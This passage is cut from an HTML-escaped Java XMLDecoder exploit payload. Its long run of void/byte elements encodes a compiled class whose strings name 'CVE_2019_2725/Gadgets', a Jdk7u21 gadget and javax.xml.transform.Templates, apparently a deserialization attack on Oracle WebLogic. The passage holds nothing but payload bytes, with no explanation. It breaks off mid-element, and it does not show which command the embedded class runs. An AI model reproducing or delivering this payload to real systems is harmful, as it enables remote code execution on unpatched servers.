index="6087"&gt;&lt;byte&gt;1&lt;/byte&gt;&lt;/void&gt;&lt;void index="6089"&gt;&lt;byte&gt;4&lt;/byte&gt;&lt;/void&gt;&lt;void index="6090"&gt;&lt;byte&gt;67&lt;/byte&gt;&lt;/void&gt;&lt;void index="6091"&gt;&lt;byte&gt;111&lt;/byte&gt;&lt;/void&gt;&lt;void index="6092"&gt;&lt;byte&gt;100&lt;/byte&gt;&lt;/void&gt;&lt;void index="6093"&gt;&lt;byte&gt;101&lt;/byte&gt;&lt;/void&gt;&lt;void index="6094"&gt;&lt;byte&gt;1&lt;/byte&gt;&lt;/void&gt;&lt;void index="6096"&gt;&lt;byte&gt;15&lt;/byte&gt;&lt;/void&gt;&lt;void index="6097"&gt;&lt;byte&gt;76&lt;/byte&gt;&lt;/void&gt;&lt;void index="6098"&gt;&lt;byte&gt;105&lt;/byte&gt;&lt;/void&gt;&lt;void index="6099"&gt;&lt;byte&gt;110&lt;/byte&gt;&lt;/void&gt;&lt;void index="6100"&gt;&lt;byte&gt;101&lt;/byte&gt;&lt;/void&gt;&lt;void index="6101"&gt;&lt;byte&gt;78&lt;/byte&gt;&lt;/void&gt;&lt;void index="6102"&gt;&lt;byte&gt;117&lt;/byte&gt;&lt;/void&gt;&lt;void index="6103"&gt;&lt;byte&gt;109&lt;/byte&gt;&lt;/void&gt;&lt;void index="6104"&gt;&lt;byte&gt;98&lt;/byte&gt;&lt;/void&gt;&lt;void index="6105"&gt;&lt;byte&gt;101&lt;/byte&gt;&lt;/void&gt;&lt;void index="6106"&gt;&lt;byte&gt;114&lt;/byte&gt;&lt;/void&gt;&lt;void index="6107"&gt;&lt;byte&gt;84&lt;/byte&gt;&lt;/void&gt;&lt;void index="6108"&gt;&lt;byte&gt;97&lt;/byte&gt;&lt;/void&gt;&lt;void index="6109"&gt;&lt;byte&gt;98&lt;/byte&gt;&lt;/void&gt;&lt;void index="6110"&gt;&lt;byte&gt;108&lt;/byte&gt;&lt;/void&gt;&lt;void index="6111"&gt;&lt;byte&gt;101&lt;/byte&gt;&lt;/void&gt;&lt;void index="6112"&gt;&lt;byte&gt;1&lt;/byte&gt;&lt;/void&gt;&lt;void index="6114"&gt;&lt;byte&gt;18&lt;/byte&gt;&lt;/void&gt;&lt;void index="6115"&gt;&lt;byte&gt;76&lt;/byte&gt;&lt;/void&gt;&lt;void index="6116"&gt;&lt;byte&gt;111&lt;/byte&gt;&lt;/void&gt;&lt;void index="6117"&gt;&lt;byte&gt;99&lt;/byte&gt;&lt;/void&gt;&lt;void index="6118"&gt;&lt;byte&gt;97&lt;/byte&gt;&lt;/void&gt;&lt;void index="6119"&gt;&lt;byte&gt;108&lt;/byte&gt;&lt;/void&gt;&lt;void index="6120"&gt;&lt;byte&gt;86&lt;/byte&gt;&lt;/void&gt;&lt;void index="6121"&gt;&lt;byte&gt;97&lt;/byte&gt;&lt;/void&gt;&lt;void index="6122"&gt;&lt;byte&gt;114&lt;/byte&gt;&lt;/void&gt;&lt;void index="6123"&gt;&lt;byte&gt;105&lt;/byte&gt;&lt;/void&gt;&lt;void index="6124"&gt;&lt;byte&gt;97&lt;/byte&gt;&lt;/void&gt;&lt;void index="6125"&gt;&lt;byte&gt;98&lt;/byte&gt;&lt;/void&gt;&lt;void index="6126"&gt;&lt;byte&gt;108&lt;/byte&gt;&lt;/void&gt;&lt;void index="6127"&gt;&lt;byte&gt;101&lt;/byte&gt;&lt;/void&gt;&lt;void index="6128"&gt;&lt;byte&gt;84&lt;/byte&gt;&lt;/void&gt;&lt;void index="6129"&gt;&lt;byte&gt;97&lt;/byte&gt;&lt;/void&gt;&lt;void index="6130"&gt;&lt;byte&gt;98&lt;/byte&gt;&lt;/void&gt;&lt;void index="6131"&gt;&lt;byte&gt;108&lt;/byte&gt;&lt;/void&gt;&lt;void index="6132"&gt;&lt;byte&gt;101&lt;/byte&gt;&lt;/void&gt;&lt;void index="6133"&gt;&lt;byte&gt;1&lt;/byte&gt;&lt;/void&gt;&lt;void index="6135"&gt;&lt;byte&gt;4&lt;/byte&gt;&lt;/void&gt;&lt;void index="6136"&gt;&lt;byte&gt;116&lt;/byte&gt;&lt;/void&gt;&lt;void index="6137"&gt;&lt;byte&gt;104&lt;/byte&gt;&lt;/void&gt;&lt;void index="6138"&gt;&lt;byte&gt;105&lt;/byte&gt;&lt;/void&gt;&lt;void index="6139"&gt;&lt;byte&gt;115&lt;/byte&gt;&lt;/void&gt;&lt;void index="6140"&gt;&lt;byte&gt;1&lt;/byte&gt;&lt;/void&gt;&lt;void index="6142"&gt;&lt;byte&gt;3&lt;/byte&gt;&lt;/void&gt;&lt;void index="6143"&gt;&lt;byte&gt;70&lt;/byte&gt;&lt;/void&gt;&lt;void index="6144"&gt;&lt;byte&gt;111&lt;/byte&gt;&lt;/void&gt;&lt;void index="6145"&gt;&lt;byte&gt;111&lt;/byte&gt;&lt;/void&gt;&lt;void index="6146"&gt;&lt;byte&gt;1&lt;/byte&gt;&lt;/void&gt;&lt;void index="6148"&gt;&lt;byte&gt;12&lt;/byte&gt;&lt;/void&gt;&lt;void index="6149"&gt;&lt;byte&gt;73&lt;/byte&gt;&lt;/void&gt;&lt;void index="6150"&gt;&lt;byte&gt;110&lt;/byte&gt;&lt;/void&gt;&lt;void index="6151"&gt;&lt;byte&gt;110&lt;/byte&gt;&lt;/void&gt;&lt;void index="6152"&gt;&lt;byte&gt;101&lt;/byte&gt;&lt;/void&gt;&lt;void index="6153"&gt;&lt;byte&gt;114&lt;/byte&gt;&lt;/void&gt;&lt;void index="6154"&gt;&lt;byte&gt;67&lt;/byte&gt;&lt;/void&gt;&lt;void index="6155"&gt;&lt;byte&gt;108&lt;/byte&gt;&lt;/void&gt;&lt;void index="6156"&gt;&lt;byte&gt;97&lt;/byte&gt;&lt;/void&gt;&lt;void index="6157"&gt;&lt;byte&gt;115&lt;/byte&gt;&lt;/void&gt;&lt;void index="6158"&gt;&lt;byte&gt;115&lt;/byte&gt;&lt;/void&gt;&lt;void index="6159"&gt;&lt;byte&gt;101&lt;/byte&gt;&lt;/void&gt;&lt;void index="6160"&gt;&lt;byte&gt;115&lt;/byte&gt;&lt;/void&gt;&lt;void index="6161"&gt;&lt;byte&gt;1&lt;/byte&gt;&lt;/void&gt;&lt;void index="6163"&gt;&lt;byte&gt;27&lt;/byte&gt;&lt;/void&gt;&lt;void index="6164"&gt;&lt;byte&gt;76&lt;/byte&gt;&lt;/void&gt;&lt;void index="6165"&gt;&lt;byte&gt;67&lt;/byte&gt;&lt;/void&gt;&lt;void index="6166"&gt;&lt;byte&gt;86&lt;/byte&gt;&lt;/void&gt;&lt;void index="6167"&gt;&lt;byte&gt;69&lt;/byte&gt;&lt;/void&gt;&lt;void index="6168"&gt;&lt;byte&gt;95&lt;/byte&gt;&lt;/void&gt;&lt;void index="6169"&gt;&lt;byte&gt;50&lt;/byte&gt;&lt;/void&gt;&lt;void index="6170"&gt;&lt;byte&gt;48&lt;/byte&gt;&lt;/void&gt;&lt;void index="6171"&gt;&lt;byte&gt;49&lt;/byte&gt;&lt;/void&gt;&lt;void index="6172"&gt;&lt;byte&gt;57&lt;/byte&gt;&lt;/void&gt;&lt;void index="6173"&gt;&lt;byte&gt;95&lt;/byte&gt;&lt;/void&gt;&lt;void index="6174"&gt;&lt;byte&gt;50&lt;/byte&gt;&lt;/void&gt;&lt;void index="6175"&gt;&lt;byte&gt;55&lt;/byte&gt;&lt;/void&gt;&lt;void index="6176"&gt;&lt;byte&gt;50&lt;/byte&gt;&lt;/void&gt;&lt;void index="6177"&gt;&lt;byte&gt;53&lt;/byte&gt;&lt;/void&gt;&lt;void index="6178"&gt;&lt;byte&gt;47&lt;/byte&gt;&lt;/void&gt;&lt;void index="6179"&gt;&lt;byte&gt;71&lt;/byte&gt;&lt;/void&gt;&lt;void index="6180"&gt;&lt;byte&gt;97&lt;/byte&gt;&lt;/void&gt;&lt;void index="6181"&gt;&lt;byte&gt;100&lt;/byte&gt;&lt;/void&gt;&lt;void index="6182"&gt;&lt;byte&gt;103&lt;/byte&gt;&lt;/void&gt;&lt;void index="6183"&gt;&lt;byte&gt;101&lt;/byte&gt;&lt;/void&gt;&lt;void index="6184"&gt;&lt;byte&gt;116&lt;/byte&gt;&lt;/void&gt;&lt;void index="6185"&gt;&lt;byte&gt;115&lt;/byte&gt;&lt;/void&gt;&lt;void index="6186"&gt;&lt;byte&gt;36&lt;/byte&gt;&lt;/void&gt;&lt;void index="6187"&gt;&lt;byte&gt;70&lt;/byte&gt;&lt;/void&gt;&lt;void index="6188"&gt;&lt;byte&gt;111&lt;/byte&gt;&lt;/void&gt;&lt;void index="6189"&gt;&lt;byte&gt;111&lt;/byte&gt;&lt;/void&gt;&lt;void index="6190"&gt;&lt;byte&gt;59&lt;/byte&gt;&lt;/void&gt;&lt;void index="6191"&gt;&lt;byte&gt;1&lt;/byte&gt;&lt;/void&gt;&lt;void index="6193"&gt;&lt;byte&gt;10&lt;/byte&gt;&lt;/void&gt;&lt;void index="6194"&gt;&lt;byte&gt;83&lt;/byte&gt;&lt;/void&gt;&lt;void index="6195"&gt;&lt;byte&gt;111&lt;/byte&gt;&lt;/void&gt;&lt;void index="6196"&gt;&lt;byte&gt;117&lt;/byte&gt;&lt;/void&gt;&lt;void index="6197"&gt;&lt;byte&gt;114&lt;/byte&gt;&lt;/void&gt;&lt;void index="6198"&gt;&lt;byte&gt;99&lt;/byte&gt;&lt;/void&gt;&lt;void index="6199"&gt;&lt;byte&gt;101&lt;/byte&gt;&lt;/void&gt;&lt;void index="6200"&gt;&lt;byte&gt;70&lt;/byte&gt;&lt;/void&gt;&lt;void index="6201"&gt;&lt;byte&gt;105&lt;/byte&gt;&lt;/void&gt;&lt;void index="6202"&gt;&lt;byte&gt;108&lt;/byte&gt;&lt;/void&gt;&lt;void index="6203"&gt;&lt;byte&gt;101&lt;/byte&gt;&lt;/void&gt;&lt;void index="6204"&gt;&lt;byte&gt;1&lt;/byte&gt;&lt;/void&gt;&lt;void index="6206"&gt;&lt;byte&gt;12&lt;/byte&gt;&lt;/void&gt;&lt;void index="6207"&gt;&lt;byte&gt;74&lt;/byte&gt;&lt;/void&gt;&lt;void index="6208"&gt;&lt;byte&gt;100&lt;/byte&gt;&lt;/void&gt;&lt;void index="6209"&gt;&lt;byte&gt;107&lt;/byte&gt;&lt;/void&gt;&lt;void index="6210"&gt;&lt;byte&gt;55&lt;/byte&gt;&lt;/void&gt;&lt;void index="6211"&gt;&lt;byte&gt;117&lt;/byte&gt;&lt;/void&gt;&lt;void index="6212"&gt;&lt;byte&gt;50&lt;/byte&gt;&lt;/void&gt;&lt;void index="6213"&gt;&lt;byte&gt;49&lt;/byte&gt;&lt;/void&gt;&lt;void index="6214"&gt;&lt;byte&gt;46&lt;/byte&gt;&lt;/void&gt;&lt;void index="6215"&gt;&lt;byte&gt;106&lt;/byte&gt;&lt;/void&gt;&lt;void index="6216"&gt;&lt;byte&gt;97&lt;/byte&gt;&lt;/void&gt;&lt;void index="6217"&gt;&lt;byte&gt;118&lt;/byte&gt;&lt;/void&gt;&lt;void index="6218"&gt;&lt;byte&gt;97&lt;/byte&gt;&lt;/void&gt;&lt;void index="6219"&gt;&lt;byte&gt;12&lt;/byte&gt;&lt;/void&gt;&lt;void index="6221"&gt;&lt;byte&gt;10&lt;/byte&gt;&lt;/void&gt;&lt;void index="6223"&gt;&lt;byte&gt;11&lt;/byte&gt;&lt;/void&gt;&lt;void index="6224"&gt;&lt;byte&gt;7&lt;/byte&gt;&lt;/void&gt;&lt;void index="6226"&gt;&lt;byte&gt;26&lt;/byte&gt;&lt;/void&gt;&lt;void index="6227"&gt;&lt;byte&gt;1&lt;/byte&gt;&lt;/void&gt;&lt;void index="6229"&gt;&lt;byte&gt;25&lt;/byte&gt;&lt;/void&gt;&lt;void index="6230"&gt;&lt;byte&gt;67&lt;/byte&gt;&lt;/void&gt;&lt;void index="6231"&gt;&lt;byte&gt;86&lt;/byte&gt;&lt;/void&gt;&lt;void index="6232"&gt;&lt;byte&gt;69&lt;/byte&gt;&lt;/void&gt;&lt;void index="6233"&gt;&lt;byte&gt;95&lt;/byte&gt;&lt;/void&gt;&lt;void index="6234"&gt;&lt;byte&gt;50&lt;/byte&gt;&lt;/void&gt;&lt;void index="6235"&gt;&lt;byte&gt;48&lt;/byte&gt;&lt;/void&gt;&lt;void index="6236"&gt;&lt;byte&gt;49&lt;/byte&gt;&lt;/void&gt;&lt;void index="6237"&gt;&lt;byte&gt;57&lt;/byte&gt;&lt;/void&gt;&lt;void index="6238"&gt;&lt;byte&gt;95&lt;/byte&gt;&lt;/void&gt;&lt;void index="6239"&gt;&lt;byte&gt;50&lt;/byte&gt;&lt;/void&gt;&lt;void index="6240"&gt;&lt;byte&gt;55&lt;/byte&gt;&lt;/void&gt;&lt;void index="6241"&gt;&lt;byte&gt;50&lt;/byte&gt;&lt;/void&gt;&lt;void index="6242"&gt;&lt;byte&gt;53&lt;/byte&gt;&lt;/void&gt;&lt;void index="6243"&gt;&lt;byte&gt;47&lt;/byte&gt;&lt;/void&gt;&lt;void index="6244"&gt;&lt;byte&gt;71&lt;/byte&gt;&lt;/void&gt;&lt;void index="6245"&gt;&lt;byte&gt;97&lt;/byte&gt;&lt;/void&gt;&lt;void index="6246"&gt;&lt;byte&gt;100&lt;/byte&gt;&lt;/void&gt;&lt;void index="6247"&gt;&lt;byte&gt;103&lt;/byte&gt;&lt;/void&gt;&lt;void index="6248"&gt;&lt;byte&gt;101&lt;/byte&gt;&lt;/void&gt;&lt;void index="6249"&gt;&lt;byte&gt;116&lt;/byte&gt;&lt;/void&gt;&lt;void index="6250"&gt;&lt;byte&gt;115&lt;/byte&gt;&lt;/void&gt;&lt;void index="6251"&gt;&lt;byte&gt;36&lt;/byte&gt;&lt;/void&gt;&lt;void index="6252"&gt;&lt;byte&gt;70&lt;/byte&gt;&lt;/void&gt;&lt;void index="6253"&gt;&lt;byte&gt;111&lt;/byte&gt;&lt;/void&gt;&lt;void index="6254"&gt;&lt;byte&gt;111&lt;/byte&gt;&lt;/void&gt;&lt;void index="6255"&gt;&lt;byte&gt;1&lt;/byte&gt;&lt;/void&gt;&lt;void index="6257"&gt;&lt;byte&gt;16&lt;/byte&gt;&lt;/void&gt;&lt;void index="6258"&gt;&lt;byte&gt;106&lt;/byte&gt;&lt;/void&gt;&lt;void index="6259"&gt;&lt;byte&gt;97&lt;/byte&gt;&lt;/void&gt;&lt;void index="6260"&gt;&lt;byte&gt;118&lt;/byte&gt;&lt;/void&gt;&lt;void index="6261"&gt;&lt;byte&gt;97&lt;/byte&gt;&lt;/void&gt;&lt;void index="6262"&gt;&lt;byte&gt;47&lt;/byte&gt;&lt;/void&gt;&lt;void index="6263"&gt;&lt;byte&gt;108&lt;/byte&gt;&lt;/void&gt;&lt;void index="6264"&gt;&lt;byte&gt;97&lt;/byte&gt;&lt;/void&gt;&lt;void index="6265"&gt;&lt;byte&gt;110&lt;/byte&gt;&lt;/void&gt;&lt;void index="6266"&gt;&lt;byte&gt;103&lt;/byte&gt;&lt;/void&gt;&lt;void index="6267"&gt;&lt;byte&gt;47&lt;/byte&gt;&lt;/void&gt;&lt;void index="6268"&gt;&lt;byte&gt;79&lt;/byte&gt;&lt;/void&gt;&lt;void index="6269"&gt;&lt;byte&gt;98&lt;/byte&gt;&lt;/void&gt;&lt;void index="6270"&gt;&lt;byte&gt;106&lt;/byte&gt;&lt;/void&gt;&lt;void index="6271"&gt;&lt;byte&gt;101&lt;/byte&gt;&lt;/void&gt;&lt;void index="6272"&gt;&lt;byte&gt;99&lt;/byte&gt;&lt;/void&gt;&lt;void index="6273"&gt;&lt;byte&gt;116&lt;/byte&gt;&lt;/void&gt;&lt;void index="6274"&gt;&lt;byte&gt;1&lt;/byte&gt;&lt;/void&gt;&lt;void index="6276"&gt;&lt;byte&gt;20&lt;/byte&gt;&lt;/void&gt;&lt;void index="6277"&gt;&lt;byte&gt;106&lt;/byte&gt;&lt;/void&gt;&lt;void index="6278"&gt;&lt;byte&gt;97&lt;/byte&gt;&lt;/void&gt;&lt;void index="6279"&gt;&lt;byte&gt;118&lt;/byte&gt;&lt;/void&gt;&lt;void index="6280"&gt;&lt;byte&gt;97&lt;/byte&gt;&lt;/void&gt;&lt;void index="6281"&gt;&lt;byte&gt;47&lt;/byte&gt;&lt;/void&gt;&lt;void index="6282"&gt;&lt;byte&gt;105&lt;/byte&gt;&lt;/void&gt;&lt;void index="6283"&gt;&lt;byte&gt;111&lt;/byte&gt;&lt;/void&gt;&lt;void index="6284"&gt;&lt;byte&gt;47&lt;/byte&gt;&lt;/void&gt;&lt;void index="6285"&gt;&lt;byte&gt;83&lt;/byte&gt;&lt;/void&gt;&lt;void index="6286"&gt;&lt;byte&gt;101&lt;/byte&gt;&lt;/void&gt;&lt;void index="6287"&gt;&lt;byte&gt;114&lt;/byte&gt;&lt;/void&gt;&lt;void index="6288"&gt;&lt;byte&gt;105&lt;/byte&gt;&lt;/void&gt;&lt;void index="6289"&gt;&lt;byte&gt;97&lt;/byte&gt;&lt;/void&gt;&lt;void index="6290"&gt;&lt;byte&gt;108&lt;/byte&gt;&lt;/void&gt;&lt;void index="6291"&gt;&lt;byte&gt;105&lt;/byte&gt;&lt;/void&gt;&lt;void index="6292"&gt;&lt;byte&gt;122&lt;/byte&gt;&lt;/void&gt;&lt;void index="6293"&gt;&lt;byte&gt;97&lt;/byte&gt;&lt;/void&gt;&lt;void index="6294"&gt;&lt;byte&gt;98&lt;/byte&gt;&lt;/void&gt;&lt;void index="6295"&gt;&lt;byte&gt;108&lt;/byte&gt;&lt;/void&gt;&lt;void index="6296"&gt;&lt;byte&gt;101&lt;/byte&gt;&lt;/void&gt;&lt;void index="6297"&gt;&lt;byte&gt;1&lt;/byte&gt;&lt;/void&gt;&lt;void index="6299"&gt;&lt;byte&gt;21&lt;/byte&gt;&lt;/void&gt;&lt;void index="6300"&gt;&lt;byte&gt;67&lt;/byte&gt;&lt;/void&gt;&lt;void index="6301"&gt;&lt;byte&gt;86&lt;/byte&gt;&lt;/void&gt;&lt;void index="6302"&gt;&lt;byte&gt;69&lt;/byte&gt;&lt;/void&gt;&lt;void index="6303"&gt;&lt;byte&gt;95&lt;/byte&gt;&lt;/void&gt;&lt;void index="6304"&gt;&lt;byte&gt;50&lt;/byte&gt;&lt;/void&gt;&lt;void index="6305"&gt;&lt;byte&gt;48&lt;/byte&gt;&lt;/void&gt;&lt;void index="6306"&gt;&lt;byte&gt;49&lt;/byte&gt;&lt;/void&gt;&lt;void index="6307"&gt;&lt;byte&gt;57&lt;/byte&gt;&lt;/void&gt;&lt;void index="6308"&gt;&lt;byte&gt;95&lt;/byte&gt;&lt;/void&gt;&lt;void index="6309"&gt;&lt;byte&gt;50&lt;/byte&gt;&lt;/void&gt;&lt;void index="6310"&gt;&lt;byte&gt;55&lt;/byte&gt;&lt;/void&gt;&lt;void index="6311"&gt;&lt;byte&gt;50&lt;/byte&gt;&lt;/void&gt;&lt;void index="6312"&gt;&lt;byte&gt;53&lt;/byte&gt;&lt;/void&gt;&lt;void index="6313"&gt;&lt;byte&gt;47&lt;/byte&gt;&lt;/void&gt;&lt;void index="6314"&gt;&lt;byte&gt;71&lt;/byte&gt;&lt;/void&gt;&lt;void index="6315"&gt;&lt;byte&gt;97&lt;/byte&gt;&lt;/void&gt;&lt;void index="6316"&gt;&lt;byte&gt;100&lt;/byte&gt;&lt;/void&gt;&lt;void index="6317"&gt;&lt;byte&gt;103&lt;/byte&gt;&lt;/void&gt;&lt;void index="6318"&gt;&lt;byte&gt;101&lt;/byte&gt;&lt;/void&gt;&lt;void index="6319"&gt;&lt;byte&gt;116&lt;/byte&gt;&lt;/void&gt;&lt;void index="6320"&gt;&lt;byte&gt;115&lt;/byte&gt;&lt;/void&gt;&lt;void index="6322"&gt;&lt;byte&gt;33&lt;/byte&gt;&lt;/void&gt;&lt;void index="6324"&gt;&lt;byte&gt;2&lt;/byte&gt;&lt;/void&gt;&lt;void index="6326"&gt;&lt;byte&gt;3&lt;/byte&gt;&lt;/void&gt;&lt;void index="6328"&gt;&lt;byte&gt;1&lt;/byte&gt;&lt;/void&gt;&lt;void index="6330"&gt;&lt;byte&gt;4&lt;/byte&gt;&lt;/void&gt;&lt;void index="6332"&gt;&lt;byte&gt;1&lt;/byte&gt;&lt;/void&gt;&lt;void index="6334"&gt;&lt;byte&gt;26&lt;/byte&gt;&lt;/void&gt;&lt;void index="6336"&gt;&lt;byte&gt;5&lt;/byte&gt;&lt;/void&gt;&lt;void index="6338"&gt;&lt;byte&gt;6&lt;/byte&gt;&lt;/void&gt;&lt;void index="6340"&gt;&lt;byte&gt;1&lt;/byte&gt;&lt;/void&gt;&lt;void index="6342"&gt;&lt;byte&gt;7&lt;/byte&gt;&lt;/void&gt;&lt;void index="6346"&gt;&lt;byte&gt;2&lt;/byte&gt;&lt;/void&gt;&lt;void index="6348"&gt;&lt;byte&gt;8&lt;/byte&gt;&lt;/void&gt;&lt;void index="6350"&gt;&lt;byte&gt;1&lt;/byte&gt;&lt;/void&gt;&lt;void index="6352"&gt;&lt;byte&gt;1&lt;/byte&gt;&lt;/void&gt;&lt;void index="6354"&gt;&lt;byte&gt;10&lt;/byte&gt;&lt;/void&gt;&lt;void index="6356"&gt;&lt;byte&gt;11&lt;/byte&gt;&lt;/void&gt;&lt;void index="6358"&gt;&lt;byte&gt;1&lt;/byte&gt;&lt;/void&gt;&lt;void index="6360"&gt;&lt;byte&gt;12&lt;/byte&gt;&lt;/void&gt;&lt;void index="6364"&gt;&lt;byte&gt;47&lt;/byte&gt;&lt;/void&gt;&lt;void index="6366"&gt;&lt;byte&gt;1&lt;/byte&gt;&lt;/void&gt;&lt;void index="6368"&gt;&lt;byte&gt;1&lt;/byte&gt;&lt;/void&gt;&lt;void index="6372"&gt;&lt;byte&gt;5&lt;/byte&gt;&lt;/void&gt;&lt;void index="6373"&gt;&lt;byte&gt;42&lt;/byte&gt;&lt;/void&gt;&lt;void index="6374"&gt;&lt;byte&gt;-73&lt;/byte&gt;&lt;/void&gt;&lt;void index="6376"&gt;&lt;byte&gt;1&lt;/byte&gt;&lt;/void&gt;&lt;void index="6377"&gt;&lt;byte&gt;-79&lt;/byte&gt;&lt;/void&gt;&lt;void index="6381"&gt;&lt;byte&gt;2&lt;/byte&gt;&lt;/void&gt;&lt;void index="6383"&gt;&lt;byte&gt;13&lt;/byte&gt;&lt;/void&gt;&lt;void index="6387"&gt;&lt;byte&gt;6&lt;/byte&gt;&lt;/void&gt;&lt;void index="6389"&gt;&lt;byte&gt;1&lt;/byte&gt;&lt;/void&gt;&lt;void index="6393"&gt;&lt;byte&gt;100&lt;/byte&gt;&lt;/void&gt;&lt;void index="6395"&gt;&lt;byte&gt;14&lt;/byte&gt;&lt;/void&gt;&lt;void index="6399"&gt;&lt;byte&gt;12&lt;/byte&gt;&lt;/void&gt;&lt;void index="6401"&gt;&lt;byte&gt;1&lt;/byte&gt;&lt;/void&gt;&lt;void index="6405"&gt;&lt;byte&gt;5&lt;/byte&gt;&lt;/void&gt;&lt;void index="6407"&gt;&lt;byte&gt;15&lt;/byte&gt;&lt;/void&gt;&lt;void index="6409"&gt;&lt;byte&gt;18&lt;/byte&gt;&lt;/void&gt;&lt;void index="6413"&gt;&lt;byte&gt;2&lt;/byte&gt;&lt;/void&gt;&lt;void index="6415"&gt;&lt;byte&gt;19&lt;/byte&gt;&lt;/void&gt;&lt;void index="6419"&gt;&lt;byte&gt;2&lt;/byte&gt;&lt;/void&gt;&lt;void index="6421"&gt;&lt;byte&gt;20&lt;/byte&gt;&lt;/void&gt;&lt;void index="6423"&gt;&lt;byte&gt;17&lt;/byte&gt;&lt;/void&gt;&lt;void index="6427"&gt;&lt;byte&gt;10&lt;/byte&gt;&lt;/void&gt;&lt;void index="6429"&gt;&lt;byte&gt;1&lt;/byte&gt;&lt;/void&gt;&lt;void index="6431"&gt;&lt;byte&gt;2&lt;/byte&gt;&lt;/void&gt;&lt;void index="6433"&gt;&lt;byte&gt;22&lt;/byte&gt;&lt;/void&gt;&lt;void index="6435"&gt;&lt;byte&gt;16&lt;/byte&gt;&lt;/void&gt;&lt;void index="6437"&gt;&lt;byte&gt;9&lt;/byte&gt;&lt;/void&gt;&lt;void index="6438"&gt;&lt;byte&gt;112&lt;/byte&gt;&lt;/void&gt;&lt;void index="6439"&gt;&lt;byte&gt;116&lt;/byte&gt;&lt;/void&gt;&lt;void index="6441"&gt;&lt;byte&gt;4&lt;/byte&gt;&lt;/void&gt;&lt;void index="6442"&gt;&lt;byte&gt;80&lt;/byte&gt;&lt;/void&gt;&lt;void index="6443"&gt;&lt;byte&gt;119&lt;/byte&gt;&lt;/void&gt;&lt;void index="6444"&gt;&lt;byte&gt;110&lt;/byte&gt;&lt;/void&gt;&lt;void index="6445"&gt;&lt;byte&gt;114&lt;/byte&gt;&lt;/void&gt;&lt;void index="6446"&gt;&lt;byte&gt;112&lt;/byte&gt;&lt;/void&gt;&lt;void index="6447"&gt;&lt;byte&gt;119&lt;/byte&gt;&lt;/void&gt;&lt;void index="6448"&gt;&lt;byte&gt;1&lt;/byte&gt;&lt;/void&gt;&lt;void index="6450"&gt;&lt;byte&gt;120&lt;/byte&gt;&lt;/void&gt;&lt;void index="6451"&gt;&lt;byte&gt;115&lt;/byte&gt;&lt;/void&gt;&lt;void index="6452"&gt;&lt;byte&gt;125&lt;/byte&gt;&lt;/void&gt;&lt;void index="6456"&gt;&lt;byte&gt;2&lt;/byte&gt;&lt;/void&gt;&lt;void index="6458"&gt;&lt;byte&gt;29&lt;/byte&gt;&lt;/void&gt;&lt;void index="6459"&gt;&lt;byte&gt;106&lt;/byte&gt;&lt;/void&gt;&lt;void index="6460"&gt;&lt;byte&gt;97&lt;/byte&gt;&lt;/void&gt;&lt;void index="6461"&gt;&lt;byte&gt;118&lt;/byte&gt;&lt;/void&gt;&lt;void index="6462"&gt;&lt;byte&gt;97&lt;/byte&gt;&lt;/void&gt;&lt;void index="6463"&gt;&lt;byte&gt;120&lt;/byte&gt;&lt;/void&gt;&lt;void index="6464"&gt;&lt;byte&gt;46&lt;/byte&gt;&lt;/void&gt;&lt;void index="6465"&gt;&lt;byte&gt;120&lt;/byte&gt;&lt;/void&gt;&lt;void index="6466"&gt;&lt;byte&gt;109&lt;/byte&gt;&lt;/void&gt;&lt;void index="6467"&gt;&lt;byte&gt;108&lt;/byte&gt;&lt;/void&gt;&lt;void index="6468"&gt;&lt;byte&gt;46&lt;/byte&gt;&lt;/void&gt;&lt;void index="6469"&gt;&lt;byte&gt;116&lt;/byte&gt;&lt;/void&gt;&lt;void index="6470"&gt;&lt;byte&gt;114&lt;/byte&gt;&lt;/void&gt;&lt;void index="6471"&gt;&lt;byte&gt;97&lt;/byte&gt;&lt;/void&gt;&lt;void index="6472"&gt;&lt;byte&gt;110&lt;/byte&gt;&lt;/void&gt;&lt;void index="6473"&gt;&lt;byte&gt;115&lt;/byte&gt;&lt;/void&gt;&lt;void index="6474"&gt;&lt;byte&gt;102&lt;/byte&gt;&lt;/void&gt;&lt;void index="6475"&gt;&lt;byte&gt;111&lt;/byte&gt;&lt;/void&gt;&lt;void index="6476"&gt;&lt;byte&gt;114&lt;/byte&gt;&lt;/void&gt;&lt;void index="6477"&gt;&lt;byte&gt;109&lt;/byte&gt;&lt;/void&gt;&lt;void index="6478"&gt;&lt;byte&gt;46&lt;/byte&gt;&lt;/void&gt;&lt;void index="6479"&gt;&lt;byte&gt;84&lt;/byte&gt;&lt;/void&gt;&lt;void index="6480"&gt;&lt;byte&gt;101&lt;/byte&gt;&lt;/void&gt;&lt;void index="6481"&gt;&lt;byte&gt;109&lt;/byte&gt;&lt;/void&gt;&lt;void index="6482"&gt;&lt;byte&gt;112&lt;/byte&gt;&lt;/void&gt;&lt;void index="6483"&gt;&lt;byte&gt;108&lt;/byte&gt;&lt;/void&gt;&lt;void index="6484"&gt;&lt;byte&gt;97&lt;/byte&gt;&lt;/void&gt;&lt;void index="6485"&gt;&lt;byte&gt;116&lt;/byte&gt;&lt;/void&gt;&lt;void index="6486"&gt;&lt;byte&gt;101&lt;/byte&gt;&lt;/void&gt;&lt;void index="6487"&gt;&lt;byte&gt;115&lt;/byte&gt;&lt;/void&gt;&lt;void index="6489"&gt;&lt;byte&gt;20&lt;/byte&gt;&lt;/void&gt;&lt;void index="6490"&gt;&lt;byte&gt;106&lt;/byte&gt;&lt;/void&gt;&lt;void index="6491"&gt;&lt;byte&gt;97&lt;/byte&gt;&lt;/void&gt;&lt;void index="6492"&gt;&lt;byte&gt;118&lt;/byte&gt;&lt;/void&gt;&lt;void index="6493"&gt;&lt;byte&gt;97&lt;/byte&gt;&lt;/void&gt;&lt;void index="6494"&gt;&lt;byte&gt;46&lt;/byte&gt;&lt;/void&gt;&lt;void index="6495"&gt;&lt;byte&gt;105&lt;/byte&gt;&lt;/void&gt;&lt;void index="6496"&gt;&lt;byte&gt;111&lt;/byte&gt;&lt;/void&gt;&lt;void index="6497"&gt;&lt;byte&gt;46&lt;/byte&gt;&lt;/void&gt;&lt;void index="6498"&gt;&lt;byte&gt;83&lt;/byte&gt;&lt;/void&gt;&lt;void index="6499"&gt;&lt;byte&gt;101&lt;/byte&gt;&lt;/void&gt;&lt;void index="6500"&gt;&lt;byte&gt;114&lt;/byte&gt;&lt;/void&gt;&lt;void index="6501"&gt;&lt;byte&gt;105&lt;/byte&gt;&lt;/void&gt;&lt;void index="6502"&gt;&lt;byte&gt;97&lt;/byte&gt;&lt;/void&gt;&lt;void index="6503"&gt;&lt;byte&gt;108&lt;/byte&gt;&lt;/void&gt;&lt;void 